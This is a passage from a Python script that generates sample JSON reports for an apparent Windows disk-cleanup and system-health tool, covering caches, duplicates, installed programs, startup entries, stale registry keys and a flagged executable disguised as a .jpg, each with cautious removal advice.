        dir_item("st-000201", f"{U}\\AppData\\Local\\Temp", "temp", "Temporary files left by programs and installers.",
                 "safe", "recycle", "Close all programs, then delete the folder's contents (not the folder). Files in use "
                                    "are skipped.", owner="Windows / apps"),
        dir_item("st-000202", f"{U}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache", "browser-cache",
                 "Chrome page cache (Default profile).", "safe", "recycle",
                 "Chrome > Settings > Privacy > Delete browsing data > Cached images and files.", owner="Google Chrome"),
        dir_item("st-000203", f"{U}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Cache", "browser-cache",
                 "Chrome page cache (Profile 1).", "safe", "recycle",
                 "Chrome > Settings > Privacy > Delete browsing data > Cached images and files.", owner="Google Chrome"),
        dir_item("st-000204", f"{U}\\AppData\\Local\\npm-cache", "package-cache", "npm download cache.",
                 "safe_after_check", "tool", "Run 'npm cache clean --force'; npm downloads packages again when needed.",
                 owner="npm"),
        dir_item("st-000205", f"{U}\\AppData\\Local\\pip\\cache", "package-cache", "pip download cache.", "safe", "tool",
                 "Run 'pip cache purge'.", owner="pip"),
        dir_item("st-000206", f"{U}\\AppData\\Local\\CrashDumps", "crash-dump", "Crash dumps from programs that crashed.",
                 "safe", "recycle", "Delete the .dmp files unless a developer asked you for them."),
        dir_item("st-000207", "C:\\Windows\\SoftwareDistribution\\Download", "os-update-cache",
                 "Downloaded Windows Update packages.", "use_tool", "tool",
                 "Disk Cleanup (cleanmgr) > Clean up system files > Windows Update Cleanup.", owner="Windows Update"),
        dir_item("st-000208", "C:\\Windows\\WinSxS", "os-component-store",
                 "Windows component store (sizes are inflated by hard links).", "do_not_touch", "none",
                 "Never delete manually. 'DISM /Online /Cleanup-Image /StartComponentCleanup' is the supported way to "
                 "shrink it.", owner="Windows", reversible=False, flags=["hardlink-heavy"]),
        dir_item("st-000209", "C:\\ProgramData\\Package Cache", "installer-cache",
                 "Cached installers needed to repair or uninstall programs.", "do_not_touch", "none",
                 "Leave it: removing it breaks repair and uninstall of Visual Studio and other programs.",
                 reversible=False),
        dir_item("st-000210", "C:\\$Recycle.Bin", "recycle-bin", "Files you already deleted.", "use_tool", "tool",
                 "Open the Recycle Bin, check its contents, then 'Empty Recycle Bin' yourself.", owner="Windows"),
        dir_item("st-000211", f"{U}\\Documents\\Projects\\app-1\\node_modules", "dev-deps",
                 "Installed npm packages of app-1.", "safe_after_check", "recycle",
                 "Can be restored with 'npm install' because the project has a lockfile."),
        dir_item("st-000212", "C:\\Windows\\Temp", "temp", "System temporary files.", "use_tool", "tool",
                 "Disk Cleanup > Temporary files.", owner="Windows"),
        dir_item("st-000213", f"{U}\\AppData\\Roaming\\Code\\CachedData", "editor-cache", "VS Code cache.",
                 "safe_after_check", "recycle", "Close VS Code first, then delete the folder.", owner="VS Code"),
        dir_item("st-000214", "C:\\Windows\\Installer", "installer-cache", "Windows Installer cache (MSI patches).",
                 "do_not_touch", "none", "Never delete manually; programs may fail to update or uninstall.",
                 reversible=False),
    ]
    write_json("storage/G1.json", envelope("G1", "storage", [
        check("storage.treemap", items=len(rows)), check("storage.big_files", items=len(g1_big)),
        check("storage.cold_folders", items=len(g1_old)), check("storage.categories", items=len(g1_junk)),
    ], [], inventory={
        "bigFiles": g1_big, "coldFolders": g1_old, "junk": g1_junk,
        "categoryTotals": {"temp": by_path[f"{U}\\AppData\\Local\\Temp"]["total"] + by_path["C:\\Windows\\Temp"]["total"],
                           "browser-cache": by_path[f"{U}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache"]["total"]},
    }))

    # ---------------------------------------------------------------- storage G2
    iso_size = int(6.1 * GB)
    groups = [
        {"group": "dup-0001", "sha256": sha("win11.iso"), "bytes": iso_size, "category": "installer-image",
         "purpose": "Two identical copies of the Windows 11 ISO.", "items": [
             {"id": "dup-0001-a", "path": f"{dl}\\Win11_23H2_English_x64.iso", "safety": "safe_after_check",
              "method": "recycle", "how": "Keep one copy (ISOs folder); delete this one.", "newestUtc": "2024-02-11T10:00:00Z"},
             {"id": "dup-0001-b", "path": f"{U}\\Documents\\ISOs\\Win11_23H2_English_x64.iso", "safety": "review",
              "method": "recycle", "how": "This is the copy to keep.", "newestUtc": "2024-02-11T10:00:00Z"}]},
        {"group": "dup-0002", "sha256": sha("holiday"), "bytes": int(1.3 * GB), "category": "personal-media",
         "purpose": "Same video saved twice.", "items": [
             {"id": "dup-0002-a", "path": f"{U}\\Videos\\2023\\trip.mp4", "safety": "review", "method": "recycle",
              "how": "Compare both copies, keep one.", "newestUtc": "2023-07-01T10:00:00Z"},
             {"id": "dup-0002-b", "path": f"{U}\\OneDrive\\Pictures\\trip.mp4", "safety": "review", "method": "recycle",
              "how": "OneDrive copy: deleting it also deletes it from the cloud.", "newestUtc": "2023-07-01T10:00:00Z",
              "flags": ["cloud_synced"]}]},
    ]
    copies = [
        dir_item("st-000301", f"{U}\\Documents\\Projects\\shop-app - Copy", "project-copy",
                 "A manual copy of the shop-app repository.", "review", "holding",
                 "It has uncommitted and unpushed work. Push or copy those changes into shop-app first, then remove the copy.",
                 flags=["work_at_risk"], gitRisk={"uncommitted": 3, "unpushed": 2, "stashes": 1},
                 original=f"{U}\\Documents\\Projects\\shop-app"),
        dir_item("st-000302", f"{U}\\.claude\\worktrees\\feature-x", "worktree", "A git worktree created by Claude Code.",
                 "safe_after_check", "tool", "Run 'git worktree remove' from the main repository (everything is pushed).",
                 gitRisk={"uncommitted": 0, "unpushed": 0, "stashes": 0}),
    ]
    write_json("storage/G2.json", envelope("G2", "storage", [
        check("storage.duplicates", items=4), check("storage.project_copies", items=2),
    ], [], inventory={"duplicateGroups": groups, "projectCopies": copies}))

    # ---------------------------------------------------------------- storage H1
    programs = [
        item("pg-0001", "C:\\Program Files (x86)\\McAfee", "program", 120 * MB, "pup",
             "McAfee WebAdvisor browser add-on, bundled with other software.", "safe_after_check", "uninstall",
             "Settings > Apps > Installed apps > McAfee WebAdvisor > Uninstall.", owner="McAfee, LLC",
             flags=["pup"], name="McAfee WebAdvisor", version="4.1.1.100", lastUsed=None, installDate="2024-02-15"),
        item("pg-0002", "C:\\Program Files\\Ollama", "program", int(4.4 * GB), "dev-tool",
             "Runs AI models locally. Models are stored separately in ~/.ollama.", "review", "uninstall",
             "Settings > Apps > Installed apps > Ollama > Uninstall.", owner="Ollama", name="Ollama", version="0.12.3",
             lastUsed="2026-08-01T10:00:00Z"),
        item("pg-0003", "C:\\Program Files (x86)\\Steam", "program", int(2.5 * GB), "games", "Steam game launcher.",
             "review", "uninstall", "Uninstall from Steam itself or Settings > Apps.", owner="Valve", name="Steam",
             version="2.10", lastUsed="2024-12-24T18:00:00Z"),
        item("pg-0004", "C:\\Program Files (x86)\\Microsoft", "program", int(1.2 * GB), "browser",
             "Microsoft Edge (part of Windows).", "do_not_touch", "none", "Part of Windows; keep it.",
             owner="Microsoft", name="Microsoft Edge", version="141.0"),
        item("pg-0005", "C:\\nvm4w\\nodejs", "program", 590 * MB, "dev-tool", "Node.js managed by nvm-windows.",
             "use_tool", "tool", "Use 'nvm list' and 'nvm uninstall <version>' instead of deleting folders.",
             owner="nvm-windows", name="Node.js 22.16 (nvm)", version="22.16.0"),
    ]
    startup = [
        item("su-0001", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SteamClient", "setting", None,
             "startup-app", "Starts Steam at sign-in.", "safe", "setting", "Task Manager > Startup apps > Steam > Disable.",
             owner="Valve", name="Steam", impact="high", startupMs=4100),
        item("su-0002", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "setting", None,
             "startup-app", "Starts 'Updater' (see finding S01-0001).", "review", "setting",
             "Task Manager > Startup apps > Updater > Disable (only after the security question is answered).",
             name="Updater", impact="low", startupMs=300),
        item("su-0003", "Service: OllamaService", "setting", None, "service", "Ollama background service.",
             "safe_after_check", "setting", "services.msc > Ollama > Startup type: Manual.", owner="Ollama",
             name="Ollama service", impact="medium"),
        item("su-0004", "Service: WSearch", "setting", None, "service", "Windows Search indexer.", "do_not_touch",
             "none", "Part of Windows; keep it.", owner="Microsoft", name="Windows Search", impact="medium"),
    ]
    write_json("storage/H1.json", envelope("H1", "storage", [
        check("programs.installed", items=len(programs)), check("startup.impact", items=len(startup)),
        check("battery.report", "partial", 1, "battery report has no usage history"),
    ], [], inventory={"installedPrograms": programs, "startupApps": startup,
                      "battery": {"designCapacityWh": 75.0, "fullChargeCapacityWh": 61.2, "wearPercent": 18.4,
                                  "cycleCount": 412}}))

    # ---------------------------------------------------------------- storage H2
    registry = [
        item("rg-0001", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{1234ABCD-GHOST}", "registry",
             None, "ghost-uninstall", "Uninstall entry of a program whose folder no longer exists.", "safe_after_check",
             "setting", "Back up the key with 'reg export', then remove the entry (it only clutters Installed apps).",
             name="Old Toolbar 2.0", effect="Shows a program in Installed apps that cannot be uninstalled."),
        item("rg-0002", "HKCU\\Environment\\Path -> C:\\tools\\old-sdk\\bin", "registry", None, "dead-path",
             "PATH entry pointing to a folder that no longer exists.", "safe_after_check", "setting",
             "System Properties > Environment Variables > Path > remove the entry.", name="Dead PATH entry",
             effect="Slightly slower command lookup; can mask other tools."),
        item("rg-0003", "HKLM\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av\\{MCAFEE-STALE}", "registry", None,
             "stale-security-center", "Stale Security Center registration of an uninstalled antivirus.", "use_tool",
             "tool", "Use the vendor's removal tool (McAfee Consumer Product Removal); do not edit by hand.",
             name="McAfee (stale)"),
    ]
    health = [
        item("hl-0001", f"{U}\\Desktop\\Old Game.lnk", "file", 2 * KB, "broken-shortcut",
             "Shortcut whose target no longer exists.", "safe", "recycle", "Delete the shortcut.",
             newest="2022-05-01T10:00:00Z"),
        item("hl-0002", f"{U}\\Desktop\\empty-notes.txt", "file", 0, "zero-byte", "Empty file.", "safe_after_check",
             "recycle", "Delete it if you do not need it.", newest="2025-01-01T00:00:00Z"),
        item("hl-0003", f"{U}\\Pictures\\2024\\IMG_0412.jpg", "file", int(1.2 * MB), "header-mismatch",
             "A .jpg file whose header says it is an executable (moved to the security list as H2-0001).",
             "review", "none", "Do not open it. See finding H2-0001.", newest="2026-10-02T10:00:00Z"),
    ]
    write_json("storage/H2.json", envelope("H2", "storage", [
        check("registry.broken_refs", items=len(registry)), check("health.shortcuts", items=1),
        check("health.disk", items=1), check("health.sfc_dism", items=2),
    ], [
        finding("H2-0001", "health.header_mismatch", "Executable header inside a .jpg file", "medium", "suspicious",
                ["masquerading"], [{"type": "file", "path": f"{U}\\Pictures\\2024\\IMG_0412.jpg", "magic": "PE32"}],
                [{"path": f"{U}\\Pictures\\2024\\IMG_0412.jpg", "sha256": sha("img0412"), "size": int(1.2 * MB),
                  "sig": "NotSigned", "signer": None, "created": "2026-10-02T10:00:00Z"}],
                fp="Some camera tools embed odd headers; still unusual.", rec="Do not open it; ask for a second opinion."),
        finding("H2-0002", "health.disk", "Recycle Bin holds 3.1 GB", "low", "hygiene"),
    ], inventory={"brokenRegistryRefs": registry, "brokenShortcuts": health[:1], "zeroByteFiles": health[1:2],
                  "headerMismatch": health[2:],
                  "diskHealth": {"reliability": {"readErrorsTotal": 0, "wearPercent": 3, "temperatureC": 41},
                                 "sfc": "Windows Resource Protection did not find any integrity violations.",
                                 "dism": {"componentStoreCorruption": False, "reclaimablePackages": 2},
                                 "ntfsEvents90d": 0}}))
    print(f"wrote {OUT} ({len(rows)} folders, scanned {scanned:,} bytes)")


if __name__ == "__main__":
    main()
